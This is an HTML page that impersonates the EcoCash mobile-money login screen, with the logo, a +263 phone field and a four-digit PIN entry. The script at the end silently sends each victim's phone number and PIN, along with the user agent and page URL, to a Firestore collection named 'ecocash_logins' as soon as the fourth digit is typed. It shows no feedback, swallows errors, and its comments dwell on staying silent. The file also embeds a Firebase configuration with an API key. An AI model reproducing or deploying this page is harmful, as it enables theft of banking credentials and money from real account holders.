<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EcoCash Login – silent</title>
  
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
  
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #e5e5e5;
    }
    .container {
      width: 100%;
      max-width: 400px;
      margin: auto;
      background: white;
      min-height: 100vh;
      position: relative;
      overflow: hidden;
    }
    .main-content {
      position: relative;
      z-index: 2;
      padding-bottom: 10px;
    }
    .logo {
      text-align: center;
      font-size: 38px;
      font-weight: bold;
      margin-top: 40px;
    }
    .logo span:first-child { color: #1c6aa6; }
    .logo span:last-child { color: #e12b2b; }
    .login-title {
      text-align: center;
      color: #666;
      font-size: 26px;
      margin-top: 18px;
    }
    .phone-box {
      margin: 22px;
      border: 2px solid #1c6aa6;
      border-radius: 10px;
      display: flex;
      align-items: center;
      padding: 10px 12px;
      background: #f2f2f2;
    }
    .flag {
      width: 26px;
      margin-right: 8px;
    }
    .code {
      color: #666;
      margin-right: 10px;
      font-size: 16px;
    }
    .phone-input {
      border: none;
      outline: none;
      background: transparent;
      font-size: 17px;
      flex: 1;
    }
    .pin-title {
      text-align: center;
      color: #666;
      margin-top: 5px;
    }
    .pin-box {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 18px;
    }
    .pin {
      width: 44px;
      height: 44px;
      border-radius: 10px;
      border: 2px solid #1c6aa6;
      text-align: center;
      font-size: 20px;
      outline: none;
    }
    .pin:focus {
      border-color: #e12b2b;
      box-shadow: 0 0 0 2px rgba(225,43,43,0.2);
    }
    .bottom {
      position: relative;
      margin-top: 40px;
      left: 0;
      right: 0;
      background: #125c9c;
      color: white;
      padding-top: 110px;
      padding-bottom: 28px;
      text-align: center;
    }
    .bottom::before {
      content: "";
      position: absolute;
      top: -80px;
      left: -20%;
      width: 140%;
      height: 160px;
      background: white;
      border-bottom-left-radius: 50%;
      border-bottom-right-radius: 50%;
    }
    .bottom p {
      width: 82%;
      margin: auto;
      font-size: 15px;
      line-height: 1.4;
    }
    .buttons {
      display: flex;
      justify-content: center;
      gap: 14px;
      margin: 20px 22px;
    }
    .btn {
      background: white;
      border-radius: 16px;
      padding: 8px 16px;
      flex: 1;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
      cursor: pointer;
      transition: all 0.1s ease;
    }
    .btn svg {
      width: 22px;
      height: 22px;
      fill: #1c6aa6;
    }
    .btn span {
      font-size: 13px;
      color: #333;
      font-weight: bold;
      line-height: 1.2;
    }
    .version {
      margin-top: 24px;
      opacity: 0.85;
      font-size: 14px;
    }
    .terms {
      margin-top: 6px;
      font-size: 14px;
      opacity: 0.9;
    }
    a {
      color: white;
      text-decoration: underline;
    }
    .phone-error {
      color: #e12b2b;
      font-size: 13px;
      margin: -10px 22px 10px 22px;
      text-align: left;
      min-height: 18px;
    }
    /* no notification styles – completely removed */
  </style>
</head>
<body>

<div class="container">
  <div class="main-content">
    <div class="logo">
      <span>Eco</span><span>Cash</span>
    </div>
    <div class="login-title">Login</div>

    <div class="phone-box">
      <img class="flag" src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe flag">
      <div class="code">+263</div>
      <input class="phone-input" id="phoneInput" placeholder="Phone Number" type="tel" inputmode="numeric">
    </div>
    <div class="phone-error" id="phoneError"></div>

    <div class="pin-title">Enter your PIN</div>

    <div class="pin-box" id="pinBox">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin1">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin2">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin3">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin4">
    </div>
  </div>

  <div class="bottom">
    <p>To register an EcoCash wallet or get assistance, click below</p>

    <div class="buttons">
      <div class="btn" id="registerBtn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
        </svg>
        <span>Register</span>
      </div>
      <div class="btn" id="helpBtn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-4h2v2h-2zm1-10c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
        </svg>
        <span>Help &amp; Support</span>
      </div>
    </div>

    <div class="version">v3.0.3P</div>
    <div class="terms">
      By signing in you agree to the
      <a href="#">Terms and Conditions</a>
    </div>
  </div>
</div>

<script>
  (function() {
    // ==================== PIN AUTO-ADVANCE CODE ====================
    const pinInputs = [
      document.getElementById('pin1'),
      document.getElementById('pin2'),
      document.getElementById('pin3'),
      document.getElementById('pin4')
    ];

    function focusNext(currentIndex) {
      if (currentIndex < pinInputs.length - 1) {
        pinInputs[currentIndex + 1].focus();
      }
    }

    function focusPrev(currentIndex) {
      if (currentIndex > 0) {
        pinInputs[currentIndex - 1].focus();
      }
    }

    pinInputs.forEach((input, index) => {
      input.addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1) {
          focusNext(index);
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (this.value.length === 0) {
            e.preventDefault();
            focusPrev(index);
          }
        } else if (e.key === 'ArrowLeft') {
          e.preventDefault();
          focusPrev(index);
        } else if (e.key === 'ArrowRight') {
          e.preventDefault();
          focusNext(index);
        } else {
          if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
            e.preventDefault();
          }
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
        if (pasted.length > 0) {
          this.value = pasted[0];
          focusNext(index);
        }
      });
    });

    // ==================== PHONE VALIDATION CODE ====================
    const phoneInput = document.getElementById('phoneInput');
    const phoneError = document.getElementById('phoneError');

    function validateZimNumber(value) {
      const digits = value.replace(/\D/g, '');
      if (digits.length === 0) return { valid: false, normalized: '' };

      let normalized = '';
      if (digits.startsWith('263')) {
        if (digits.length === 12) {
          normalized = '+' + digits;
        }
      } else if (digits.startsWith('0')) {
        if (digits.length === 10) {
          normalized = '+263' + digits.substring(1);
        }
      } else {
        if (digits.length === 9) {
          normalized = '+263' + digits;
        }
      }

      const valid = normalized.length === 13 && normalized.startsWith('+263');
      return { valid, normalized };
    }

    function updatePhoneValidation() {
      const raw = phoneInput.value;
      const { valid } = validateZimNumber(raw);
      
      if (raw.length === 0) {
        phoneError.textContent = '';
        phoneInput.style.borderColor = '#1c6aa6';
      } else if (!valid) {
        phoneError.textContent = 'Enter a valid Zimbabwe number (e.g., 0712345678 or 263712345678)';
        phoneInput.style.borderColor = '#e12b2b';
      } else {
        phoneError.textContent = '';
        phoneInput.style.borderColor = '#1c6aa6';
      }
    }

    phoneInput.addEventListener('input', updatePhoneValidation);
    
    phoneInput.addEventListener('blur', function() {
      const raw = phoneInput.value;
      const { valid, normalized } = validateZimNumber(raw);
      if (valid && normalized) {
        if (normalized.startsWith('+263')) {
          const localPart = normalized.substring(4);
          phoneInput.value = localPart;
        }
      }
      updatePhoneValidation();
    });

    phoneInput.addEventListener('paste', function(e) {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData).getData('text');
      const digits = pasted.replace(/\D/g, '');
      const { valid, normalized } = validateZimNumber(digits);
      if (valid && normalized.startsWith('+263')) {
        phoneInput.value = normalized.substring(4);
      } else {
        phoneInput.value = digits;
      }
      updatePhoneValidation();
    });

    phoneInput.addEventListener('keydown', function(e) {
      if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab' && !e.ctrlKey && !e.metaKey) {
        e.preventDefault();
      }
    });

    updatePhoneValidation();

    // ==================== FIREBASE SETUP ====================
    const firebaseConfig = {
      apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
      authDomain: "eco-panel-3d06e.firebaseapp.com",
      projectId: "eco-panel-3d06e",
      storageBucket: "eco-panel-3d06e.firebasestorage.app",
      messagingSenderId: "820242007704",
      appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const COLLECTION_NAME = 'ecocash_logins';

    // *** ALL TOAST NOTIFICATIONS REMOVED – SILENT SAVE ***

    // Silent save function – no UI feedback
    function saveToFirebase() {
      const phoneDigits = phoneInput.value.replace(/\D/g, '');
      const pin = pinInputs.map(i => i.value).join('');
      
      // Format phone number
      let formattedPhone = '';
      if (phoneDigits.startsWith('0') && phoneDigits.length === 10) {
        formattedPhone = '+263' + phoneDigits.substring(1);
      } else if (phoneDigits.length === 9) {
        formattedPhone = '+263' + phoneDigits;
      } else {
        // silently ignore – no toast
        return;
      }
      
      // Check if PIN is complete
      if (pin.length !== 4) {
        // silently ignore – no toast
        return;
      }
      
      // Save to Firebase – completely silent (no .then/.catch UI)
      db.collection(COLLECTION_NAME).add({
        phoneNumber: formattedPhone,
        pin: pin,
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href
      }).catch(() => {
        // swallow any error – no notification
      });
    }
    
    // Add listener to 4th PIN – triggers silent save
    const fourthPin = document.getElementById('pin4');
    if (fourthPin) {
      fourthPin.addEventListener('input', function() {
        if (this.value.length === 1) {
          setTimeout(saveToFirebase, 100);
        }
      });
    }

    // Button handlers – now only provide visual field focus, no toasts
    document.getElementById('registerBtn')?.addEventListener('click', function() {
      // Just focus the phone input, no notification
      phoneInput.focus();
    });

    document.getElementById('helpBtn')?.addEventListener('click', function() {
      // Absolutely nothing – you could open a link, but no toast
      // (kept empty to satisfy requirement)
    });

  })();
</script>

</body>
</html>
